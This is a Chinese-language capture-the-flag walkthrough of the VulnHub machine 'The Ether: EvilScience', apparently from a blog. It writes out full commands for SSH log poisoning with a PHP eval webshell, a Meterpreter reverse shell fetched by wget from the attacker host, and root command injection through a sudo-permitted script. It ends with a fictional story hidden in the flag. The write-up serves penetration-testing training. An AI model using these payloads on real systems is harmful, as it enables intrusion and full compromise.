# 原创
：  VulnHub渗透测试实战靶场 - THE ETHER: EVILSCIENCE

# VulnHub渗透测试实战靶场 - THE ETHER: EVILSCIENCE

#### VulnHub渗透测试实战靶场 - THE ETHER: EVILSCIENCE

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/theether/theEther_1.0.1.zip)


## THE ETHER: EVILSCIENCE靶机搭建

> 
将下载好的靶机导入Vmware，网络连接设置为NAT模式即可


> 
攻击机IP地址：`192.168.246.129`


## 渗透测试

### 信息搜集

> 
用`netdiscover`查看一下：`sudo netdiscover -r 192.168.246.0/24`，探测到目标靶机IP地址为：`192.168.246.133`


> 
用Namp探测一下目标IP：`sudo nmap -sS -A 192.168.246.133`，发现目标靶机开放了22端口和80端口


### 漏洞挖掘

> 
用dirsearch扫描一下web目录：`python3 dirsearch.py -u http://192.168.246.133 -e *.php`


> 
根据扫描结果进行查看是，发现url很可疑`http://192.168.246.133/index.php?file=about.php`，疑似存在文件包含漏洞，结合开放了22端口，测试后发现可以包含`/var/log/auth.log`文件，并且可以利用ssh登录产生错误日志写入一句话木马：`ssh '&lt;?php eval($_GET[d1no]);?&gt;'@192.168.246.133`


### getshell

> 
用msfvenom生成Meterpreter shell


```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.246.129 LPORT=1234 -f elf &gt; shell.elf

```

> 
Metasploit设置监听


```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.246.129
set lport 1234
exploit

```

> 
种植Meterpreter shell，使用Python搭建一个简单的Web Server： `python2 -m SimpleHTTPServer 80`，然后利用前面获得的一句话执行命令，下载生成的木马并运行


```
/?file=/var/log/auth.log&amp;d1no=system('wget+192.168.246.129/shell.elf')%3b
/?file=/var/log/auth.log&amp;d1no=system('chmod+%2bx+shell.elf')%3b
/?file=/var/log/auth.log&amp;d1no=system('./shell.elf')%3b

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7d5a9993262f41d090d6dcd0e6abf0fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a15fa8b787344becb03a570ef1952938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

### 提权

> 
先将获取到的shell转变为交互式的shell：`python -c 'import pty;pty.spawn("/bin/bash")'`


> 
执行命令`sudo -l`查看是否属于sudo组，发现可以使用sudo权限不需要密码执行`xxxlogauditorxxx.py`


> 
查看是否存在可提权SUID：`find / -perm -u=s -type f 2&gt;/dev/null`


> 
使用sudo权限不需要密码执行xxxlogauditorxxx.py，查看py文件的内容发现里边有很大一部分内容使用了base64编码；将xxxlogauditorxxx.py拷贝网网站目录下，使用wget下载查看py文件的内容


```
cp xxxlogauditorxxx.py /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
wget http://192.168.246.133/?file=xxxlogauditorxxx.py

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ce9856ea7b7442ff9b238ece78da0305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/82c96bd3cce34791ac1ab170a084ccb4.png#pic_center"/>

> 
在这个python脚本中，可以执行命令，当运行`/var/log/auth.log | id`命令的时候，可以以root身份来执行


> 
把flag.png文件拷贝到网站根目录下：`/var/log/auth.log | cp /root/flag.png /var/www/html/theEther.com/public_html/flag.png`


> 
将图片下载下来：`wget http://192.168.246.133/?file=flag.png`


> 
用HxD查看图片发现字符串


```
flag: b2N0b2JlciAxLCAyMDE3LgpXZSBoYXZlIG9yIGZpcnN0IGJhdGNoIG9mIHZvbHVudGVlcnMgZm9yIHRoZSBnZW5vbWUgcHJvamVjdC4gVGhlIGdyb3VwIGxvb2tzIHByb21pc2luZywgd2UgaGF2ZSBoaWdoIGhvcGVzIGZvciB0aGlzIQoKT2N0b2JlciAzLCAyMDE3LgpUaGUgZmlyc3QgaHVtYW4gdGVzdCB3YXMgY29uZHVjdGVkLiBPdXIgc3VyZ2VvbnMgaGF2ZSBpbmplY3RlZCBhIGZlbWFsZSBzdWJqZWN0IHdpdGggdGhlIGZpcnN0IHN0cmFpbiBvZiBhIGJlbmlnbiB2aXJ1cy4gTm8gcmVhY3Rpb25zIGF0IHRoaXMgdGltZSBmcm9tIHRoaXMgcGF0aWVudC4KCk9jdG9iZXIgMywgMjAxNy4KU29tZXRoaW5nIGhhcyBnb25lIHdyb25nLiBBZnRlciBhIGZldyBob3VycyBvZiBpbmplY3Rpb24sIHRoZSBodW1hbiBzcGVjaW1lbiBhcHBlYXJzIHN5bXB0b21hdGljLCBleGhpYml0aW5nIGRlbWVudGlhLCBoYWxsdWNpbmF0aW9ucywgc3dlYXRpbmcsIGZvYW1pbmcgb2YgdGhlIG1vdXRoLCBhbmQgcmFwaWQgZ3Jvd3RoIG9mIGNhbmluZSB0ZWV0aCBhbmQgbmFpbHMuCgpPY3RvYmVyIDQsIDIwMTcuCk9ic2VydmluZyBvdGhlciBjYW5kaWRhdGVzIHJlYWN0IHRvIHRoZSBpbmplY3Rpb25zLiBUaGUgZXRoZXIgc2VlbXMgdG8gd29yayBmb3Igc29tZSBidXQgbm90IGZvciBvdGhlcnMuIEtlZXBpbmcgY2xvc2Ugb2JzZXJ2YXRpb24gb24gZmVtYWxlIHNwZWNpbWVuIG9uIE9jdG9iZXIgM3JkLgoKT2N0b2JlciA3LCAyMDE3LgpUaGUgZmlyc3QgZmxhdGxpbmUgb2YgdGhlIHNlcmllcyBvY2N1cnJlZC4gVGhlIGZlbWFsZSBzdWJqZWN0IHBhc3NlZC4gQWZ0ZXIgZGVjcmVhc2luZywgbXVzY2xlIGNvbnRyYWN0aW9ucyBhbmQgbGlmZS1saWtlIGJlaGF2aW9ycyBhcmUgc3RpbGwgdmlzaWJsZS4gVGhpcyBpcyBpbXBvc3NpYmxlISBTcGVjaW1lbiBoYXMgYmVlbiBtb3ZlZCB0byBhIGNvbnRhaW5tZW50IHF1YXJhbnRpbmUgZm9yIGZ1cnRoZXIgZXZhbHVhdGlvbi4KCk9jdG9iZXIgOCwgMjAxNy4KT3RoZXIgY2FuZGlkYXRlcyBhcmUgYmVnaW5uaW5nIHRvIGV4aGliaXQgc2ltaWxhciBzeW1wdG9tcyBhbmQgcGF0dGVybnMgYXMgZmVtYWxlIHNwZWNpbWVuLiBQbGFubmluZyB0byBtb3ZlIHRoZW0gdG8gcXVhcmFudGluZSBhcyB3ZWxsLgoKT2N0b2JlciAxMCwgMjAxNy4KSXNvbGF0ZWQgYW5kIGV4cG9zZWQgc3ViamVjdCBhcmUgZGVhZCwgY29sZCwgbW92aW5nLCBnbmFybGluZywgYW5kIGF0dHJhY3RlZCB0byBmbGVzaCBhbmQvb3IgYmxvb2QuIENhbm5pYmFsaXN0aWMtbGlrZSBiZWhhdmlvdXIgZGV0ZWN0ZWQuIEFuIGFudGlkb3RlL3ZhY2NpbmUgaGFzIGJlZW4gcHJvcG9zZWQuCgpPY3RvYmVyIDExLCAyMDE3LgpIdW5kcmVkcyBvZiBwZW9wbGUgaGF2ZSBiZWVuIGJ1cm5lZCBhbmQgYnVyaWVkIGR1ZSB0byB0aGUgc2lkZSBlZmZlY3RzIG9mIHRoZSBldGhlci4gVGhlIGJ1aWxkaW5nIHdpbGwgYmUgYnVybmVkIGFsb25nIHdpdGggdGhlIGV4cGVyaW1lbnRzIGNvbmR1Y3RlZCB0byBjb3ZlciB1cCB0aGUgc3RvcnkuCgpPY3RvYmVyIDEzLCAyMDE3LgpXZSBoYXZlIGRlY2lkZWQgdG8gc3RvcCBjb25kdWN0aW5nIHRoZXNlIGV4cGVyaW1lbnRzIGR1ZSB0byB0aGUgbGFjayBvZiBhbnRpZG90ZSBvciBldGhlci4gVGhlIG1haW4gcmVhc29uIGJlaW5nIHRoZSBudW1lcm91cyBkZWF0aCBkdWUgdG8gdGhlIHN1YmplY3RzIGRpc3BsYXlpbmcgZXh0cmVtZSByZWFjdGlvbnMgdGhlIHRoZSBlbmdpbmVlcmVkIHZpcnVzLiBObyBwdWJsaWMgYW5ub3VuY2VtZW50IGhhcyBiZWVuIGRlY2xhcmVkLiBUaGUgQ0RDIGhhcyBiZWVuIHN1c3BpY2lvdXMgb2Ygb3VyIHRlc3RpbmdzIGFuZCBhcmUgY29uc2lkZXJpbmcgbWFydGlhbCBsYXdzIGluIHRoZSBldmVudCBvZiBhbiBvdXRicmVhayB0byB0aGUgZ2VuZXJhbCBwb3B1bGF0aW9uLgoKLS1Eb2N1bWVudCBzY2hlZHVsZWQgdG8gYmUgc2hyZWRkZWQgb24gT2N0b2JlciAxNXRoIGFmdGVyIFBTQS4K

```

> 
base64解密得到flag


```
october 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.

```
